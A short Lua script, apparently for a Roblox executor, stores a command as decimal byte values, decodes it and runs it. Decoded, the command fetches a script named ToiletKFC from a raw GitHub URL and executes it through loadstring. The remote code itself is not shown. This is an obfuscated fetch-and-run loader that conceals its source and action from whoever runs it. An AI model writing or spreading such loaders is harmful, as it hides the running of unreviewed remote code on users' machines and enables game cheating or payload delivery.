local code_bytes = {
    108, 111, 97, 100, 115, 116, 114, 105, 110, 103, 40, 103, 97, 109, 101, 58,
    72, 116, 116, 112, 71, 101, 116, 40, 34, 104, 116, 116, 112, 115, 58, 47, 47,
    114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111,
    110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 106, 101, 116, 45, 112, 101,
    116, 115, 119, 97, 114, 109, 47, 84, 111, 105, 108, 101, 116, 75, 70, 67, 47,
    114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47,
    84, 111, 105, 108, 101, 116, 75, 70, 67, 34, 41, 41, 40, 41
}

local script_str = ""
for i = 1, #code_bytes do
    script_str = script_str .. string.char(code_bytes[i])
end

loadstring(script_str)()
